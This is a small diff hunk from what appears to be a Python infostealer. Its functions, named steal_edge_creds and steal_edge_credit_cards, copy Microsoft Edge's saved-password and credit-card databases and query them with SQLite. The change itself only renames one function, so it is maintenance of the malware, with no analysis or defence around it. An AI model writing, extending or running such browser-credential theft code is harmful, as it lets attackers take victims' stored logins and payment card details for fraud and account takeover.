@@ -101,7 +101,7 @@ def steal_edge_creds(): # get edge credentials
     con.close() # Close SQLite3 connection
     return edge_creds
 
-def steal_edge_credit_cards_info(): # get edge credit cards
+def steal_edge_credit_cards(): # get edge credit cards
     __copy_db_file(__EDGE_CREDIT_CARDS_FILE, __EDGE_CREDIT_CARDS_COPY_FILE)
     con, cur = __open_db_connection(__EDGE_CREDIT_CARDS_COPY_FILE)
     credit_cards = __get_edge_credit_cards(cur)
